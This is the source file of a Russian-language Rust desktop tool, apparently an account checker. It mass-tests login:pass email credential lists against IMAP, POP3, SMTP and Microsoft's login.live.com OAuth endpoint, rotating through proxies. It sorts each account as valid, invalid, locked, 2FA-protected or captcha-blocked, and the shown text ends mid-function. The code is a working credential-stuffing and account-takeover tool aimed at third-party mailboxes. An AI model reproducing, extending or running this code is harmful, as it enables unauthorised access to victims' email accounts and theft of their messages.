// Mail Checker: нативное окно (WebView2) с HTML5-интерфейсом.
// Массовая проверка почт формата login:pass (IMAP, POP3, SMTP) + автоопределение серверов + поиск писем + экспорт файлов.
#![cfg_attr(windows, windows_subsystem = "windows")]

mod epp_api;
mod hosts_api;
use std::collections::HashMap;
use std::io::{Read, Write};
use std::net::{SocketAddr, TcpStream, ToSocketAddrs};
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicBool, AtomicU64, AtomicUsize, Ordering};
use std::sync::{Arc, Condvar, LazyLock, Mutex, RwLock};
use std::time::{Duration, Instant};
use base64::Engine;
use serde::{Deserialize, Serialize};
use tao::dpi::LogicalSize;
use tao::event::{Event, WindowEvent};
use tao::event_loop::{ControlFlow, EventLoopBuilder, EventLoopProxy};
use tao::window::WindowBuilder;
#[cfg(target_os = "windows")]
use tao::platform::windows::{WindowBuilderExtWindows, WindowExtWindows};
use wry::http::{Request, Response};
use wry::WebViewBuilder;

const PAGE: &str = include_str!("ui.html");

static CANCEL: AtomicBool = AtomicBool::new(false);
static PAUSED: AtomicBool = AtomicBool::new(false);
static PAUSE_NOTIFY: (Mutex<bool>, Condvar) = (Mutex::new(false), Condvar::new());
static BUSY: AtomicBool = AtomicBool::new(false);
static ROW_ID: AtomicU64 = AtomicU64::new(1);
static RUN_ID: AtomicU64 = AtomicU64::new(1);
static PROXY_IX: AtomicUsize = AtomicUsize::new(0);

static DNS_CACHE: LazyLock<RwLock<HashMap<String, (Vec<SocketAddr>, Instant)>>> =
    LazyLock::new(|| RwLock::new(HashMap::new()));
static AUTO_CACHE: LazyLock<Arc<Mutex<HashMap<String, Hosts>>>> =
    LazyLock::new(|| Arc::new(Mutex::new(HashMap::new())));
static TLS_CONNECTOR: LazyLock<Result<native_tls::TlsConnector, String>> = LazyLock::new(|| {
    native_tls::TlsConnector::builder()
        .build()
        .map_err(|e| format!("ошибка инициализации TLS: {e}"))
});
static TLS_CONNECTOR_INSECURE: LazyLock<Result<native_tls::TlsConnector, String>> = LazyLock::new(|| {
    native_tls::TlsConnector::builder()
        .danger_accept_invalid_certs(true)
        .danger_accept_invalid_hostnames(true)
        .build()
        .map_err(|e| format!("ошибка TLS прокси: {e}"))
});

pub fn resolve_dns(host: &str, port: u16) -> Result<Vec<SocketAddr>, (Cat, String)> {
    let key = format!("{host}:{port}");
    let now = Instant::now();
    if let Ok(guard) = DNS_CACHE.read() {
        if let Some((addrs, ts)) = guard.get(&key) {
            if now.duration_since(*ts) < Duration::from_secs(600) {
                if addrs.is_empty() {
                    return Err((Cat::ServerNf, "хост не найден в DNS (кэш)".into()));
                }
                return Ok(addrs.clone());
            }
        }
    }
    let res = (host, port).to_socket_addrs();
    match res {
        Ok(iter) => {
            let addrs = iter.collect::<Vec<_>>();
            if addrs.is_empty() {
                if let Ok(mut guard) = DNS_CACHE.write() {
                    guard.insert(key, (Vec::new(), now));
                }
                return Err((Cat::ServerNf, "нет доступных IP-адресов".into()));
            }
            if let Ok(mut guard) = DNS_CACHE.write() {
                guard.insert(key, (addrs.clone(), now));
            }
            Ok(addrs)
        }
        Err(e) => {
            if let Ok(mut guard) = DNS_CACHE.write() {
                guard.insert(key, (Vec::new(), now));
            }
            Err((Cat::ServerNf, format!("ошибка DNS: {e}")))
        }
    }
}

pub fn get_tls_connector(insecure: bool) -> Result<&'static native_tls::TlsConnector, (Cat, String)> {
    if insecure {
        match &*TLS_CONNECTOR_INSECURE {
            Ok(c) => Ok(c),
            Err(e) => Err((Cat::Proxy, e.clone())),
        }
    } else {
        match &*TLS_CONNECTOR {
            Ok(c) => Ok(c),
            Err(e) => Err((Cat::Tls, e.clone())),
        }
    }
}
#[derive(Debug)]
enum WinAction {
    Close,
    Min,
    MaxToggle,
    Drag,
}

enum UserEvent {
    Eval(String),
    Win(WinAction),
}

fn default_true() -> bool {
    true
}

// ---------- ТРАНСПОРТНЫЙ СЛОЙ, ПРОКСИ, ТАЙМАУТЫ ----------

pub trait ReadWrite: Read + Write + Send + std::fmt::Debug {}
impl<T: Read + Write + Send + std::fmt::Debug> ReadWrite for T {}
pub type Stream = Box<dyn ReadWrite>;

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum ProxyKind {
    Socks5,
    Socks4,
    Http,
    Https,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Proxy {
    pub kind: ProxyKind,
    pub host: String,
    pub port: u16,
    pub user: Option<String>,
    pub pass: Option<String>,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum Cat {
    Success,
    Found,
    Corporate,
    Invalid,
    TwoFA,
    Locked,
    RateLimited,
    Captcha,
    Timeout,
    Connection,
    Tls,
    ServerNf,
    Proxy,
    Protocol,
}

impl Cat {
    pub fn key(&self) -> &'static str {
        match self {
            Cat::Success => "success",
            Cat::Found => "found",
            Cat::Corporate => "corporate",
            Cat::Invalid => "invalid",
            Cat::TwoFA => "twofa",
            Cat::Locked => "locked",
            Cat::RateLimited => "ratelimited",
            Cat::Captcha => "captcha",
            Cat::Timeout => "timeout",
            Cat::Connection => "connection",
            Cat::Tls => "tls",
            Cat::ServerNf => "servernf",
            Cat::Proxy => "proxy",
            Cat::Protocol => "protocol",
        }
    }

    fn priority(&self) -> usize {
        match self {
            Cat::Success => 0,
            Cat::TwoFA => 1,
            Cat::Locked => 2,
            Cat::Invalid => 3,
            Cat::Captcha => 4,
            Cat::RateLimited => 5,
            Cat::Proxy => 6,
            Cat::Tls => 7,
            Cat::Timeout => 8,
            Cat::ServerNf => 9,
            Cat::Connection => 10,
            Cat::Protocol => 11,
            Cat::Found | Cat::Corporate => 12,
        }
    }
}

pub fn parse_proxy(line: &str, default: ProxyKind) -> Option<Proxy> {
    let mut s = line.trim();
    if s.is_empty() || s.starts_with('#') {
        return None;
    }

    let mut kind = default;
    if let Some(rest) = s.strip_prefix("socks5://") {
        kind = ProxyKind::Socks5;
        s = rest;
    } else if let Some(rest) = s.strip_prefix("socks4://") {
        kind = ProxyKind::Socks4;
        s = rest;
    } else if let Some(rest) = s.strip_prefix("https://") {
        kind = ProxyKind::Https;
        s = rest;
    } else if let Some(rest) = s.strip_prefix("http://") {
        kind = ProxyKind::Http;
        s = rest;
    }

    let (host, port, user, pass) = if let Some((creds, ep)) = s.split_once('@') {
        let (u, p) = creds
            .split_once(':')
            .map(|(u, p)| (Some(u.to_string()), Some(p.to_string())))
            .unwrap_or((Some(creds.to_string()), None));
        let (h, port_str) = ep.split_once(':')?;
        let port: u16 = port_str.parse().ok()?;
        (h.trim().to_string(), port, u, p)
    } else {
        let parts: Vec<&str> = s.split(':').map(|x| x.trim()).collect();
        match parts.len() {
            2 => {
                let port: u16 = parts[1].parse().ok()?;
                (parts[0].to_string(), port, None, None)
            }
            4 => {
                let port: u16 = parts[1].parse().ok()?;
                (
                    parts[0].to_string(),
                    port,
                    Some(parts[2].to_string()),
                    Some(parts[3].to_string()),
                )
            }
            _ => return None,
        }
    };

    if host.is_empty() || port == 0 {
        return None;
    }

    Some(Proxy {
        kind,
        host,
        port,
        user,
        pass,
    })
}

pub fn parse_proxies(raw: &str, default: ProxyKind) -> Vec<Proxy> {
    raw.lines().filter_map(|l| parse_proxy(l, default)).collect()
}

pub fn dial(
    target_host: &str,
    target_port: u16,
    proxy: Option<&Proxy>,
    to: Duration,
) -> Result<Stream, (Cat, String)> {
    match proxy {
        None => {
            let addrs = resolve_dns(target_host, target_port)?;
            let mut last_err = None;
            for addr in addrs {
                match TcpStream::connect_timeout(&addr, to) {
                    Ok(tcp) => {
                        let _ = tcp.set_nodelay(true);
                        let _ = tcp.set_read_timeout(Some(to));
                        let _ = tcp.set_write_timeout(Some(to));
                        return Ok(Box::new(tcp));
                    }
                    Err(e) => {
                        let cat = if e.kind() == std::io::ErrorKind::TimedOut
                            || e.kind() == std::io::ErrorKind::WouldBlock
                        {
                            Cat::Timeout
                        } else {
                            Cat::Connection
                        };
                        last_err = Some((cat, e.to_string()));
                    }
                }
            }
            Err(last_err.unwrap_or_else(|| (Cat::Connection, "нет доступных адресов".into())))
        }
        Some(p) => {
            let addrs = resolve_dns(&p.host, p.port).map_err(|(cat, e)| {
                (
                    if cat == Cat::ServerNf { Cat::Proxy } else { cat },
                    format!("ошибка DNS прокси: {e}"),
                )
            })?;
            let mut connected = None;
            for addr in addrs {
                if let Ok(tcp) = TcpStream::connect_timeout(&addr, to) {
                    let _ = tcp.set_nodelay(true);
                    let _ = tcp.set_read_timeout(Some(to));
                    let _ = tcp.set_write_timeout(Some(to));
                    connected = Some(tcp);
                    break;
                }
            }
            let tcp = connected
                .ok_or_else(|| (Cat::Proxy, "не удалось подключиться к прокси".into()))?;

            let mut base: Stream = if p.kind == ProxyKind::Https {
                let connector = get_tls_connector(true)?;
                match connector.connect(&p.host, tcp) {
                    Ok(tls) => Box::new(tls),
                    Err(native_tls::HandshakeError::Failure(e)) => {
                        return Err((Cat::Proxy, format!("ошибка рукопожатия TLS прокси: {e}")));
                    }
                    Err(native_tls::HandshakeError::WouldBlock(_)) => {
                        return Err((Cat::Proxy, "таймаут рукопожатия TLS прокси".into()));
                    }
                }
            } else {
                Box::new(tcp)
            };

            match p.kind {
                ProxyKind::Socks5 => {
                    let has_auth = p.user.is_some() && p.pass.is_some();
                    if has_auth {
                        base.write_all(&[0x05, 0x02, 0x00, 0x02])
                            .map_err(|e| (Cat::Proxy, e.to_string()))?;
                    } else {
                        base.write_all(&[0x05, 0x01, 0x00])
                            .map_err(|e| (Cat::Proxy, e.to_string()))?;
                    }
                    let mut resp = [0u8; 2];
                    base.read_exact(&mut resp)
                        .map_err(|e| (Cat::Proxy, format!("чтение ответа SOCKS5: {e}")))?;
                    if resp[0] != 0x05 {
                        return Err((Cat::Proxy, "неверная версия SOCKS5".into()));
                    }
                    if resp[1] == 0x02 {
                        let user = p.user.as_deref().unwrap_or("");
                        let pass = p.pass.as_deref().unwrap_or("");
                        let mut auth_req = Vec::with_capacity(3 + user.len() + pass.len());
                        auth_req.push(0x01);
                        auth_req.push(user.len() as u8);
                        auth_req.extend_from_slice(user.as_bytes());
                        auth_req.push(pass.len() as u8);
                        auth_req.extend_from_slice(pass.as_bytes());
                        base.write_all(&auth_req).map_err(|e| (Cat::Proxy, e.to_string()))?;

                        let mut auth_resp = [0u8; 2];
                        base.read_exact(&mut auth_resp)
                            .map_err(|e| (Cat::Proxy, format!("чтение авторизации SOCKS5: {e}")))?;
                        if auth_resp[1] != 0x00 {
                            return Err((Cat::Proxy, "ошибка авторизации SOCKS5".into()));
                        }
                    } else if resp[1] != 0x00 {
                        return Err((
                            Cat::Proxy,
                            format!("неподдерживаемый метод авторизации SOCKS5: {}", resp[1]),
                        ));
                    }

                    // SOCKS5 CONNECT
                    let host_bytes = target_host.as_bytes();
                    if host_bytes.len() > 255 {
                        return Err((Cat::Proxy, "целевой хост слишком длинный".into()));
                    }
                    let mut conn_req = Vec::with_capacity(7 + host_bytes.len());
                    conn_req.extend_from_slice(&[0x05, 0x01, 0x00, 0x03, host_bytes.len() as u8]);
                    conn_req.extend_from_slice(host_bytes);
                    conn_req.extend_from_slice(&target_port.to_be_bytes());
                    base.write_all(&conn_req).map_err(|e| (Cat::Proxy, e.to_string()))?;

                    let mut head = [0u8; 4];
                    base.read_exact(&mut head)
                        .map_err(|e| (Cat::Proxy, format!("чтение статуса подключения SOCKS5: {e}")))?;
                    if head[1] != 0x00 {
                        return Err((Cat::Proxy, format!("код ошибки SOCKS5: {}", head[1])));
                    }
                    match head[3] {
                        0x01 => {
                            let mut buf = [0u8; 6];
                            base.read_exact(&mut buf)
                                .map_err(|e| (Cat::Proxy, e.to_string()))?;
                        }
                        0x03 => {
                            let mut len = [0u8; 1];
                            base.read_exact(&mut len)
                                .map_err(|e| (Cat::Proxy, e.to_string()))?;
                            let mut buf = vec![0u8; len[0] as usize + 2];
                            base.read_exact(&mut buf)
                                .map_err(|e| (Cat::Proxy, e.to_string()))?;
                        }
                        0x04 => {
                            let mut buf = [0u8; 18];
                            base.read_exact(&mut buf)
                                .map_err(|e| (Cat::Proxy, e.to_string()))?;
                        }
                        _ => return Err((Cat::Proxy, "неизвестный тип адреса SOCKS5".into())),
                    }
                    Ok(base)
                }
                ProxyKind::Socks4 => {
                    let port_bytes = target_port.to_be_bytes();
                    let mut req = Vec::with_capacity(16 + target_host.len());
                    req.extend_from_slice(&[
                        0x04, 0x01, port_bytes[0], port_bytes[1], 0x00, 0x00, 0x00, 0x01,
                    ]);
                    if let Some(user) = &p.user {
                        req.extend_from_slice(user.as_bytes());
                    }
                    req.push(0x00);
                    req.extend_from_slice(target_host.as_bytes());
                    req.push(0x00);
                    base.write_all(&req).map_err(|e| (Cat::Proxy, e.to_string()))?;

                    let mut resp = [0u8; 8];
                    base.read_exact(&mut resp)
                        .map_err(|e| (Cat::Proxy, format!("чтение ответа SOCKS4: {e}")))?;
                    if resp[1] != 0x5A {
                        return Err((Cat::Proxy, format!("код ошибки SOCKS4: {}", resp[1])));
                    }
                    Ok(base)
                }
                ProxyKind::Http | ProxyKind::Https => {
                    let mut req = format!(
                        "CONNECT {target_host}:{target_port} HTTP/1.1\r\nHost: {target_host}:{target_port}\r\n"
                    );
                    if let (Some(u), Some(pw)) = (&p.user, &p.pass) {
                        let auth =
                            base64::engine::general_purpose::STANDARD.encode(format!("{u}:{pw}"));
                        req.push_str(&format!("Proxy-Authorization: Basic {auth}\r\n"));
                    }
                    req.push_str("\r\n");
                    base.write_all(req.as_bytes())
                        .map_err(|e| (Cat::Proxy, e.to_string()))?;

                    let mut response_bytes = Vec::new();
                    let mut buf = [0u8; 1];
                    while !response_bytes.ends_with(b"\r\n\r\n") {
                        if response_bytes.len() > 8192 {
                            return Err((Cat::Proxy, "заголовок HTTP-прокси слишком длинный".into()));
                        }
                        base.read_exact(&mut buf)
                            .map_err(|e| (Cat::Proxy, format!("чтение HTTP-прокси: {e}")))?;
                        response_bytes.push(buf[0]);
                    }
                    let resp_str = String::from_utf8_lossy(&response_bytes);
                    let first_line = resp_str.lines().next().unwrap_or("");
                    if first_line.contains(" 200 ") || first_line.ends_with(" 200") {
                        Ok(base)
                    } else {
                        Err((Cat::Proxy, format!("ошибка HTTP-прокси: {first_line}")))
                    }
                }
            }
        }
    }
}

pub fn tls_wrap(domain: &str, base: Stream) -> Result<native_tls::TlsStream<Stream>, (Cat, String)> {
    let connector = get_tls_connector(false)?;
    match connector.connect(domain, base) {
        Ok(tls) => Ok(tls),
        Err(native_tls::HandshakeError::Failure(e)) => {
            Err((Cat::Tls, format!("ошибка рукопожатия TLS: {e}")))
        }
        Err(native_tls::HandshakeError::WouldBlock(_)) => {
            Err((Cat::Timeout, "таймаут рукопожатия TLS".into()))
        }
    }
}

// ---------- ПРОВАЙДЕРЫ, АВТООПРЕДЕЛЕНИЕ, СТРАНА, FREEMAIL ----------

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct Hosts {
    pub imap: Vec<String>,
    pub pop3: Vec<String>,
    pub smtp: Vec<String>,
}

pub fn known_provider(domain: &str) -> Option<Hosts> {
    match domain {
        "gmail.com" | "googlemail.com" => Some(Hosts {
            imap: vec!["imap.gmail.com".into()],
            pop3: vec!["pop.gmail.com".into()],
            smtp: vec!["smtp.gmail.com".into()],
        }),
        "yandex.ru" | "yandex.com" | "ya.ru" | "yandex.by" | "yandex.kz" | "yandex.ua" => {
            Some(Hosts {
                imap: vec!["imap.yandex.ru".into()],
                pop3: vec!["pop.yandex.ru".into()],
                smtp: vec!["smtp.yandex.ru".into()],
            })
        }
        "mail.ru" | "bk.ru" | "inbox.ru" | "list.ru" | "internet.ru" | "mail.ua" => Some(Hosts {
            imap: vec!["imap.mail.ru".into()],
            pop3: vec!["pop.mail.ru".into()],
            smtp: vec!["smtp.mail.ru".into()],
        }),
        "rambler.ru" | "lenta.ru" | "autorambler.ru" | "myrambler.ru" | "ro.ru" => Some(Hosts {
            imap: vec!["imap.rambler.ru".into()],
            pop3: vec!["pop.rambler.ru".into()],
            smtp: vec!["smtp.rambler.ru".into()],
        }),
        "outlook.com" | "hotmail.com" | "live.com" | "msn.com" | "outlook.ru" | "hotmail.ru"
        | "passport.com" | "windowslive.com" | "live.ru" | "hotmail.fr" | "hotmail.de" | "hotmail.it" | "hotmail.co.uk" => {
            Some(Hosts {
                imap: vec!["outlook.office365.com".into()],
                pop3: vec!["outlook.office365.com".into()],
                smtp: vec!["smtp.office365.com".into()],
            })
        }
        "yahoo.com" | "ymail.com" | "rocketmail.com" | "yahoo.fr" | "yahoo.de" | "yahoo.co.uk" | "yahoo.es" | "yahoo.it" => Some(Hosts {
            imap: vec!["imap.mail.yahoo.com".into()],
            pop3: vec!["pop.mail.yahoo.com".into()],
            smtp: vec!["smtp.mail.yahoo.com".into()],
        }),
        "icloud.com" | "me.com" | "mac.com" => Some(Hosts {
            imap: vec!["imap.mail.me.com".into()],
            pop3: vec![],
            smtp: vec!["smtp.mail.me.com".into()],
        }),
        "aol.com" | "aim.com" => Some(Hosts {
            imap: vec!["imap.aol.com".into()],
            pop3: vec!["pop.aol.com".into()],
            smtp: vec!["smtp.aol.com".into()],
        }),
        "gmx.com" | "gmx.net" | "gmx.de" | "gmx.at" | "gmx.ch" => Some(Hosts {
            imap: vec!["imap.gmx.com".into(), "imap.gmx.net".into()],
            pop3: vec!["pop.gmx.com".into(), "pop.gmx.net".into()],
            smtp: vec!["mail.gmx.com".into(), "mail.gmx.net".into()],
        }),
        "web.de" => Some(Hosts {
            imap: vec!["imap.web.de".into()],
            pop3: vec!["pop3.web.de".into()],
            smtp: vec!["smtp.web.de".into()],
        }),
        "zoho.com" | "zoho.eu" => Some(Hosts {
            imap: vec!["imap.zoho.com".into(), "imap.zoho.eu".into()],
            pop3: vec!["pop.zoho.com".into(), "pop.zoho.eu".into()],
            smtp: vec!["smtp.zoho.com".into(), "smtp.zoho.eu".into()],
        }),
        "interia.pl" | "interia.eu" | "poczta.fm" => Some(Hosts {
            imap: vec!["poczta.interia.pl".into()],
            pop3: vec!["poczta.interia.pl".into()],
            smtp: vec!["poczta.interia.pl".into()],
        }),
        "wp.pl" | "o2.pl" | "tlen.pl" => Some(Hosts {
            imap: vec!["poczta.o2.pl".into(), "poczta.wp.pl".into()],
            pop3: vec!["poczta.o2.pl".into(), "poczta.wp.pl".into()],
            smtp: vec!["poczta.o2.pl".into(), "poczta.wp.pl".into()],
        }),
        "onet.pl" | "op.pl" | "onet.eu" | "spoko.pl" | "amorki.pl" => Some(Hosts {
            imap: vec!["poczta.onet.pl".into()],
            pop3: vec!["pop3.poczta.onet.pl".into()],
            smtp: vec!["smtp.poczta.onet.pl".into()],
        }),
        "seznam.cz" | "email.cz" | "post.cz" => Some(Hosts {
            imap: vec!["imap.seznam.cz".into()],
            pop3: vec!["pop3.seznam.cz".into()],
            smtp: vec!["smtp.seznam.cz".into()],
        }),
        "ukr.net" => Some(Hosts {
            imap: vec!["imap.ukr.net".into()],
            pop3: vec!["pop3.ukr.net".into()],
            smtp: vec!["smtp.ukr.net".into()],
        }),
        "i.ua" => Some(Hosts {
            imap: vec!["imap.i.ua".into()],
            pop3: vec!["pop.i.ua".into()],
            smtp: vec!["smtp.i.ua".into()],
        }),
        "t-online.de" => Some(Hosts {
            imap: vec!["secureimap.t-online.de".into()],
            pop3: vec!["securepop.t-online.de".into()],
            smtp: vec!["securesmtp.t-online.de".into()],
        }),
        "freenet.de" => Some(Hosts {
            imap: vec!["mx.freenet.de".into()],
            pop3: vec!["mx.freenet.de".into()],
            smtp: vec!["mx.freenet.de".into()],
        }),
        "orange.fr" | "wanadoo.fr" => Some(Hosts {
            imap: vec!["imap.orange.fr".into()],
            pop3: vec!["pop.orange.fr".into()],
            smtp: vec!["smtp.orange.fr".into()],
        }),
        "free.fr" => Some(Hosts {
            imap: vec!["imap.free.fr".into()],
            pop3: vec!["pop.free.fr".into()],
            smtp: vec!["smtp.free.fr".into()],
        }),
        "sfr.fr" | "neuf.fr" => Some(Hosts {
            imap: vec!["imap.sfr.fr".into()],
            pop3: vec!["pop.sfr.fr".into()],
            smtp: vec!["smtp.sfr.fr".into()],
        }),
        "laposte.net" => Some(Hosts {
            imap: vec!["imap.laposte.net".into()],
            pop3: vec!["pop.laposte.net".into()],
            smtp: vec!["smtp.laposte.net".into()],
        }),
        "libero.it" => Some(Hosts {
            imap: vec!["imapmail.libero.it".into()],
            pop3: vec!["popmail.libero.it".into()],
            smtp: vec!["smtp.libero.it".into()],
        }),
        "virgilio.it" => Some(Hosts {
            imap: vec!["in.virgilio.it".into()],
            pop3: vec!["in.virgilio.it".into()],
            smtp: vec!["out.virgilio.it".into()],
        }),
        "fastmail.com" | "fastmail.fm" => Some(Hosts {
            imap: vec!["imap.fastmail.com".into()],
            pop3: vec!["pop.fastmail.com".into()],
            smtp: vec!["smtp.fastmail.com".into()],
        }),
        "mail.com" | "email.com" | "usa.com" | "post.com" => Some(Hosts {
            imap: vec!["imap.mail.com".into()],
            pop3: vec!["pop.mail.com".into()],
            smtp: vec!["smtp.mail.com".into()],
        }),
        "comcast.net" => Some(Hosts {
            imap: vec!["imap.comcast.net".into()],
            pop3: vec!["pop3.comcast.net".into()],
            smtp: vec!["smtp.comcast.net".into()],
        }),
        "att.net" | "sbcglobal.net" | "bellsouth.net" => Some(Hosts {
            imap: vec!["imap.mail.att.net".into()],
            pop3: vec!["inbound.att.net".into()],
            smtp: vec!["smtp.mail.att.net".into()],
        }),
        "verizon.net" => Some(Hosts {
            imap: vec!["imap.aol.com".into()],
            pop3: vec!["pop.verizon.net".into()],
            smtp: vec!["smtp.verizon.net".into()],
        }),
        "cox.net" => Some(Hosts {
            imap: vec!["imap.cox.net".into()],
            pop3: vec!["pop.cox.net".into()],
            smtp: vec!["smtp.cox.net".into()],
        }),
        "proton.me" | "protonmail.com" => Some(Hosts {
            imap: vec!["127.0.0.1".into()],
            pop3: vec![],
            smtp: vec!["127.0.0.1".into()],
        }),
        _ => None,
    }
}

fn extract_xml_tag(xml: &str, tag: &str) -> Option<String> {
    let open = format!("<{tag}>");
    let close = format!("</{tag}>");
    let start = xml.find(&open)? + open.len();
    let end = xml[start..].find(&close)? + start;
    let val = xml[start..end].trim();
    if val.is_empty() {
        None
    } else {
        Some(val.to_string())
    }
}

/// Поиск через публичную базу Autoconfig (Thunderbird ISPDB)
pub fn autoconfig_lookup(domain: &str, timeout: Duration) -> Option<Hosts> {
    let mut stream = dial(
        "autoconfig.thunderbird.net",
        80,
        None,
        timeout,
    )
    .ok()?;
    let req = format!(
        "GET /v1.1/{domain} HTTP/1.1\r\nHost: autoconfig.thunderbird.net\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n"
    );
    stream.write_all(req.as_bytes()).ok()?;
    let mut resp = Vec::new();
    let mut buf = [0u8; 1024];
    while let Ok(n) = stream.read(&mut buf) {
        if n == 0 || resp.len() > 16384 {
            break;
        }
        resp.extend_from_slice(&buf[..n]);
    }
    let body = String::from_utf8_lossy(&resp);
    if !body.contains("<clientConfig") {
        return None;
    }

    let mut imap = Vec::new();
    let mut pop3 = Vec::new();
    let mut smtp = Vec::new();

    for server_block in body.split("<incomingServer").skip(1) {
        let is_imap = server_block.starts_with(" type=\"imap\"")
            || server_block.contains("type=\"imap\"");
        let is_pop = server_block.starts_with(" type=\"pop3\"")
            || server_block.contains("type=\"pop3\"");
        if let Some(host) = extract_xml_tag(server_block, "hostname") {
            if is_imap && !imap.contains(&host) {
                imap.push(host);
            } else if is_pop && !pop3.contains(&host) {
                pop3.push(host);
            }
        }
    }

    for server_block in body.split("<outgoingServer").skip(1) {
        if let Some(host) = extract_xml_tag(server_block, "hostname") {
            if !smtp.contains(&host) {
                smtp.push(host);
            }
        }
    }

    if imap.is_empty() && pop3.is_empty() && smtp.is_empty() {
        None
    } else {
        Some(Hosts { imap, pop3, smtp })
    }
}

/// Автоопределение хостов (база конфигураций, ISPDB, TLD-эвристики и динамическое кэширование).
/// Если `use_shared_hosts` включён — сначала спрашиваем единую БД на сервере EPP.
pub fn discover_hosts(
    domain: &str,
    use_auto: bool,
    use_shared_hosts: bool,
    auto_timeout: Duration,
    cache: &Mutex<HashMap<String, Hosts>>,
) -> (Hosts, bool) {
    if let Ok(c) = cache.lock() {
        if let Some(h) = c.get(domain) {
            return (h.clone(), true);
        }
    }

    if let Some(h) = known_provider(domain) {
        return (h, false);
    }

    if use_shared_hosts {
        if let Some(h) = hosts_api::fetch(domain, Duration::from_millis(300)) {
            if let Ok(mut c) = cache.lock() {
                c.insert(domain.to_string(), h.clone());
            }
            return (h, true);
        }
    }

    if use_auto {
        let fast_to = auto_timeout.min(Duration::from_millis(800));
        if let Some(h) = autoconfig_lookup(domain, fast_to) {
            if let Ok(mut c) = cache.lock() {
                c.insert(domain.to_string(), h.clone());
            }
            if use_shared_hosts {
                hosts_api::submit(domain.to_string(), h.clone());
            }
            return (h, true);
        }

        // Адаптивные компактные эвристики (самые высоковероятные)
        let mut imap = vec![format!("imap.{domain}"), format!("mail.{domain}")];
        let pop3 = vec![format!("pop.{domain}"), format!("mail.{domain}")];
        let mut smtp = vec![format!("smtp.{domain}"), format!("mail.{domain}")];

        // Если это поддомен (например, mail.company.com) -> добавляем корневой домен
        let parts: Vec<&str> = domain.split('.').collect();
        if parts.len() > 2 {
            let root = parts[parts.len() - 2..].join(".");
            imap.push(format!("imap.{root}"));
            smtp.push(format!("smtp.{root}"));
        }

        let hosts = Hosts { imap, pop3, smtp };
        if let Ok(mut c) = cache.lock() {
            c.insert(domain.to_string(), hosts.clone());
        }
        return (hosts, true);
    }

    (hosts_for(domain), false)
}

pub fn hosts_for(domain: &str) -> Hosts {
    if let Some(h) = known_provider(domain) {
        return h;
    }
    Hosts {
        imap: vec![format!("imap.{domain}"), format!("mail.{domain}")],
        pop3: vec![
            format!("pop.{domain}"),
            format!("pop3.{domain}"),
            format!("mail.{domain}"),
        ],
        smtp: vec![format!("smtp.{domain}"), format!("mail.{domain}")],
    }
}

pub fn country(domain: &str) -> String {
    let tld = domain.rsplit('.').next().unwrap_or("");
    if tld.len() == 2 && tld.is_ascii() && tld.chars().all(|c| c.is_alphabetic()) {
        tld.to_uppercase()
    } else {
        "UN".to_string()
    }
}

pub fn is_freemail(domain: &str) -> bool {
    known_provider(domain).is_some()
}

pub fn domain_of(login: &str) -> String {
    login.split('@').nth(1).unwrap_or("").to_lowercase()
}

pub fn url_encode(s: &str) -> String {
    let mut out = String::with_capacity(s.len() * 3);
    for b in s.as_bytes() {
        match *b {
            b'a'..=b'z' | b'A'..=b'Z' | b'0'..=b'9' | b'-' | b'_' | b'.' | b'~' => {
                out.push(*b as char);
            }
            _ => {
                out.push_str(&format!("%{:02X}", b));
            }
        }
    }
    out
}

pub fn is_microsoft_domain(domain: &str) -> bool {
    let d = domain.to_lowercase();
    let base = d.trim();
    let prefixes = [
        "outlook.", "hotmail.", "live.", "msn.", "passport.", "windowslive.", "office365.",
    ];
    for p in prefixes {
        if base.starts_with(p) {
            return true;
        }
    }
    matches!(
        base,
        "outlook.com"
            | "hotmail.com"
            | "live.com"
            | "msn.com"
            | "passport.com"
            | "windowslive.com"
            | "office365.com"
    )
}

pub fn is_microsoft_linked(domain: &str, hosts: &Hosts) -> bool {
    if is_microsoft_domain(domain) {
        return true;
    }
    let ms_indicators = [
        "outlook.com",
        "office365.com",
        "microsoft.com",
        "protection.outlook.com",
        "live.com",
        "hotmail.com",
    ];
    for h in hosts.imap.iter().chain(hosts.pop3.iter()).chain(hosts.smtp.iter()) {
        let hl = h.to_lowercase();
        for ind in ms_indicators {
            if hl.contains(ind) {
                return true;
            }
        }
    }
    false
}

pub fn try_microsoft_oauth(
    a: &Acct,
    proxy: Option<&Proxy>,
    to: Duration,
) -> Result<u32, (Cat, String)> {
    let host = "login.live.com";
    let port = 443;
    let stream = dial(host, port, proxy, to)?;
    let mut tls = tls_wrap(host, stream)?;

    let client_id = "0000000048093EE0";
    let scope = "service%3A%3Ahttp%3A%2F%2Fpassport.net%2Fpurpose%3A%3Acompact";
    let username_enc = url_encode(&a.login);
    let password_enc = url_encode(&a.pass);
    let post_body = format!(
        "client_id={client_id}&redirect_uri=https%3A%2F%2Flogin.live.com%2Foauth20_desktop.srf&response_type=token&scope={scope}&grant_type=password&username={username_enc}&password={password_enc}"
    );

    let req = format!(
        "POST /oauth20_token.srf HTTP/1.1\r\n\
         Host: login.live.com\r\n\
         User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n\
         Content-Type: application/x-www-form-urlencoded\r\n\
         Content-Length: {}\r\n\
         Connection: close\r\n\r\n\
         {}",
        post_body.len(),
        post_body
    );

    tls.write_all(req.as_bytes())
        .map_err(|e| (Cat::Connection, format!("ошибка отправки запроса MS OAuth: {e}")))?;

    let mut resp = Vec::new();
    let mut buf = [0u8; 2048];
    while let Ok(n) = tls.read(&mut buf) {
        if n == 0 || resp.len() > 65536 {
            break;
        }
        resp.extend_from_slice(&buf[..n]);
    }
    let body = String::from_utf8_lossy(&resp);

    if body.contains("\"access_token\"") || body.contains("access_token=") {
        return Ok(0);
    }

    if body.contains("AADSTS50126")
        || body.contains("AADSTS50034")
        || body.contains("\"error\":\"invalid_grant\"")
        || body.contains("Invalid user name or password")
    {
        return Err((Cat::Invalid, "неверный логин или пароль (MS OAuth)".into()));
    }
    if body.contains("AADSTS50076")
        || body.contains("AADSTS50079")
        || body.contains("AADSTS50078")
        || body.contains("interaction_required")
        || body.contains("two_step_verification_required")
    {
        return Err((Cat::TwoFA, "требуется 2FA подтверждение (MS OAuth)".into()));
    }
    if body.contains("AADSTS50053")
        || body.contains("AADSTS50057")
        || body.contains("AADSTS53003")
